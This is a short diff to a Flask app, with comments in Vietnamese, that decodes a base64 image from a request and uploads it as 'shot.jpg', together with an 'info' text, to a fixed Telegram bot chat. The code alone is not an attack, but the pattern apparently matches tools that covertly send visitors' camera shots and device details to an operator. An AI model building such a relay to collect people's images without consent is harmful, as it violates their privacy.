@@ -1,6 +1,6 @@
 # -*- coding: utf-8 -*-
-# Flask app chạy được trên cả Termux (local) và Vercel (serverless)
 import os
+import base64
 import requests
 from flask import Flask, request, jsonify, render_template
 
@@ -26,16 +26,23 @@ def upload():
     img_b64 = data.get("image", "")
     info    = data.get("info", "")
 
+    # --- GỬI ẢNH: decode base64 -> bytes -> multipart file upload ---
     if img_b64:
         try:
+            # bỏ prefix nếu có (data:image/jpeg;base64,...)
+            if "," in img_b64:
+                img_b64 = img_b64.split(",", 1)[1]
+            img_bytes = base64.b64decode(img_b64)
             requests.post(
                 f"https://api.telegram.org/bot{TG_TOKEN}/sendPhoto",
-                data={"chat_id": TG_CHAT, "photo": "data:image/jpeg;base64," + img_b64},
-                timeout=10,
+                data={"chat_id": TG_CHAT},
+                files={"photo": ("shot.jpg", img_bytes, "image/jpeg")},
+                timeout=15,
             )
         except Exception as e:
             print("sendPhoto err:", e)
 
+    # --- GỬI INFO: text message ---
     if info:
         try:
             requests.post(
